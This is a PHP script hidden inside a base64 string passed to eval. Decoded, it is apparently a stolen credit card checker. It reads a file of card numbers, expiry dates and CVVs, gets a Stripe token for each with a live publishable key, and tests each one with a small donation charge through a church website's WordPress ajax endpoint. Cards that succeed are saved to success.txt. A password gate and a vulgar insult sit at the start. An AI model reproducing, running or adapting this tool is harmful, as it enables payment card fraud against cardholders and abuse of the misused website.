<?php
eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzeXN0ZW0oJ2NsZWFyJyk7CnNsZWVwKDIpOwplY2hvICJcZVs5Mjs1bUlucHV0IFRva2VuIDogIjsKJHRlbWFuID0gdHJpbShmZ2V0cyhTVERJTikpOwppZigkdGVtYW4gPT0gInBheXpnYW50ZW5nIil7CgllY2hvICJcblsrXSBMb2dpbiBTdWNjZXNcblxlWzBtIjsgCglzbGVlcCgyKTsKfWVsc2V7CgllY2hvICJcZVs5MTs1bVxuWyFdIFRva2VuIFNhbGFoIEtvbnRvbFxuXGVbMG0iOwoJZXhpdCgxKTsKfQpzbGVlcCgxKTsKc3lzdGVtKCdjbGVhcicpOwplY2hvICJcZVszMm0gX19fICAgICBfX18gICAgICAgICAgICAgIF8KfCBfX3xfX18vIF9ffCBfX18gXyBfX18gXyhfKV9fIF9fXwp8IF98fF8gL1xfXyBcLyAtXykgJ19cIFYgLyAvIF8vIC1fKQp8X19fL19ffHxfX18vXF9fX3xffCAgXF8vfF9cX19cX19ffFxlWzBtXG5cbiI7CmVjaG8gIlxlWzdtQ29kZWQgQnkgUGF5eiBJRFxlWzBtXG5cbiI7CgpyZXF1aXJlICdpbmNsdWRlcy9jbGFzc19jdXJsLnBocCc7CmNsYXNzIGNoZWNrZXIKewogICAgcHVibGljIGZ1bmN0aW9uIEdldFRva2VuKCRjYXJkLCAkbW9udGgsICR5ZWFyLCAkY3ZjKQogICAgewogICAgICAgICRjdXJsICAgPSBuZXcgY3VybCgpOwogICAgICAgICRkYXRhICAgPSAndGltZV9vbl9wYWdlPTQ5MTI4NCZwYXN0ZWRfZmllbGRzPW51bWJlciZndWlkPWZlZmNjNGVmLTMzNGYtNGI0My05MzYyLWExNWIxNWQwYmQ5MiZtdWlkPThlN2JjNTMwLTM3ZDAtNGYwOS05OTMxLTY0YTFlMzMzNTY4MiZzaWQ9MGIxYWUwZjAtZWRiMS00YWM4LWE0MjUtZWQwNjlkN2E5NmE0JmtleT1wa19saXZlX2trSU9pb3F2TVFzNGxlYzc2Z1g5QXA1UiZwYXltZW50X3VzZXJfYWdlbnQ9c3RyaXBlLmpzJTJGOWRjMTdhYiZjYXJkW25hbWVdPU5hdGFzaGErSm9lJmNhcmRbbnVtYmVyXT0nLiRjYXJkLicmY2FyZFtleHBfbW9udGhdPScuJG1vbnRoLicmY2FyZFtleHBfeWVhcl09Jy4keWVhci4nJmNhcmRbY3ZjXT0nLiRjdmMuJyc7CiAgICAgICAgJHBvc3QgICA9ICRjdXJsLT5wb3N0KCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YxL3Rva2VucycsICRkYXRhKTsKICAgICAgICAkcmVzcG9uID0ganNvbl9kZWNvZGUoJHBvc3QsIHRydWUpOwogICAgICAgIGlmKCRyZXNwb25bJ2lkJ10pCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgICAgICAgICAndG9rZW4nICAgICA9PiAkcmVzcG9uWydpZCddLAogICAgICAgICAgICAgICAgJ2NhcmRfaWQnICAgPT4gJHJlc3BvblsnY2FyZCddWydpZCddLAogICAgICAgICAgICAgICAgJ2JyYW5kJyAgICAgPT4gJHJlc3BvblsnY2FyZCddWydicmFuZCddLAogICAgICAgICAgICAgICAgJ2Z1bmRpbmcnICAgPT4gJHJlc3BvblsnY2FyZCddWydmdW5kaW5nJ10KICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gYXJyYXkoJ2Vycm9yJyA9PiB0cnVlKTsKICAgICAgICB9CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIENoZWNrTGl2ZSgkdG9rZW4pCiAgICB7CiAgICAgICAgJGN1cmwgICA9IG5ldyBjdXJsKCk7CgkJJGN1cmwtPmNvb2tpZXMoJ2Nvb2tpZXMudHh0Jyk7CiAgICAgICAgJGhlYWRlciA9IGFycmF5KAogICAgICAgICAgICAnaGVhZGVyJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICdIb3N0OiB3d3cuY2h1cmNob2Znb2RwYWNvaW1hLmNvbScsCiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgnLAogICAgICAgICAgICAgICAgJ1JlZmVyZXI6IGh0dHBzOi8vd3d3LmNodXJjaG9mZ29kcGFjb2ltYS5jb20vZG9uYXRlLycsCiAgICAgICAgICAgICAgICAnWC1SZXF1ZXN0LVdpdGg6IFhNTEh0dHBSZXF1ZXN0JwogICAgICAgICAgICApCiAgICAgICAgKTsKICAgICAgICAkZGF0YVsnaGVhZGVyJ10gPSAkY3VybC0+aGVhZGVyKCRoZWFkZXIpOwoKICAgICAgICAkZGF0YSAgID0gJ2FjdGlvbj13cF9mdWxsX3N0cmlwZV9wYXltZW50X2NoYXJnZSZmb3JtTmFtZT1Eb25hdGlvbiZmdWxsc3RyaXBlX25hbWU9TmF0YXNoYStKb2UmZnVsbHN0cmlwZV9lbWFpbD1pbmZvJTQwa29tby5uZXQmZnVsbHN0cmlwZV9jdXN0b21faW5wdXQ9Mzg2NTMwNDIzOSZmdWxsc3RyaXBlX2N1c3RvbV9hbW91bnQ9MiZmdWxsc3RyaXBlX2FkZHJlc3NfbGluZTE9Mjc2OSsrV2lsbGlzK0F2ZW51ZSZmdWxsc3RyaXBlX2FkZHJlc3NfbGluZTI9JmZ1bGxzdHJpcGVfYWRkcmVzc19jaXR5PVBhbGF0a2EmZnVsbHN0cmlwZV9hZGRyZXNzX3N0YXRlPUZsb3JpZGEmZnVsbHN0cmlwZV9hZGRyZXNzX3ppcD0zMjA3NyZzdHJpcGVUb2tlbj0nLiR0b2tlbi4nJzsKICAgICAgICAkcG9zdCAgID0gJGN1cmwtPnBvc3QoJ2h0dHBzOi8vd3d3LmNodXJjaG9mZ29kcGFjb2ltYS5jb20vd3AtYWRtaW4vYWRtaW4tYWpheC5waHAnLCAkZGF0YSk7CiAgICAgICAgJHJlc3BvbiA9IGpzb25fZGVjb2RlKCRwb3N0LCB0cnVlKTsKICAgICAgICBpZigkcmVzcG9uWydzdWNjZXNzJ10pCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgICAgICAgICAnc3VjY2VzcycgICA9PiB0cnVlLAogICAgICAgICAgICAgICAgJ3Blc2FuJyAgICAgPT4gJHJlc3BvblsnbXNnJ10sCiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIGFycmF5KAogICAgICAgICAgICAgICAgJ3N1Y2Nlc3MnICAgPT4gZmFsc2UsCiAgICAgICAgICAgICAgICAncGVzYW4nICAgICA9PiAkcmVzcG9uWydtc2cnXSwKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHJlYWRsaW5lKCRwZXNhbikKICAgIHsKICAgICAgICBlY2hvICdbK10gJy4kcGVzYW47CiAgICAgICAgJGphd2FiID0gcnRyaW0oZmdldHMoU1RESU4pKTsKICAgICAgICByZXR1cm4gJGphd2FiOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBydW4oKQogICAgewogICAgICAgICRpbnB1dCAgPSAkdGhpcy0+cmVhZGxpbmUoIlxlWzMxbUlucHV0IENDIEZpbGUgOiBcZVszMW0iKTsKICAgICAgICAkbGlzdCAgID0gZmlsZV9nZXRfY29udGVudHMoJGlucHV0KTsKICAgICAgICAkbGlzdCAgID0gZXhwbG9kZShQSFBfRU9MLCAkbGlzdCk7CgogICAgICAgIGZvcmVhY2goJGxpc3QgYXMgJG51bWJlciA9PiAka2FydHUpCiAgICAgICAgewogICAgICAgICAgICAka2FydHUgPSB0cmltKCRrYXJ0dSk7CiAgICAgICAgICAgIGxpc3QoJG5vbW9yLCAkYnVsYW4sICR0YWh1biwgJGN2dikgPSBleHBsb2RlKCd8JywgJGthcnR1KTsKCiAgICAgICAgICAgIGVjaG8gIlxlWzMybVsrXUNoZWNraW5nIFxlWzMybSIuY291bnQoJGxpc3QpLiIgPT4gJG5vbW9yfCRidWxhbnwkdGFodW58JGN2diAiOwoKICAgICAgICAgICAgJHRva2VuICA9ICR0aGlzLT5HZXRUb2tlbigkbm9tb3IsICRidWxhbiwgJHRhaHVuLCAkY3Z2KTsKICAgICAgICAgICAgJGNoYXJnZSA9ICR0aGlzLT5DaGVja0xpdmUoJHRva2VuWyd0b2tlbiddKTsKICAgICAgICAgICAgaWYoJHRva2VuWydlcnJvciddKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBlY2hvICdSZWFzb24gOiBUb2tlbiBFcnJvcic7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZigkY2hhcmdlWydzdWNjZXNzJ10gPT09IHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGJ1YXQgPSBmb3Blbignc3VjY2Vzcy50eHQnLCAnYScpOwogICAgICAgICAgICAgICAgICAgIGZ3cml0ZSgkYnVhdCwgJG5vbW9yLid8Jy4kYnVsYW4uJ3wnLiR0YWh1bi4nfCcuJGN2dik7CiAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRidWF0KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVjaG8gIlxuXGVbMzNtTWVzc2FnZTogKCIuJGNoYXJnZVsncGVzYW4nXS4iKVxyXG5cZVswbSI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCiRjaGVjayA9IG5ldyBjaGVja2VyOwokY2hlY2stPnJ1bigpOw=='));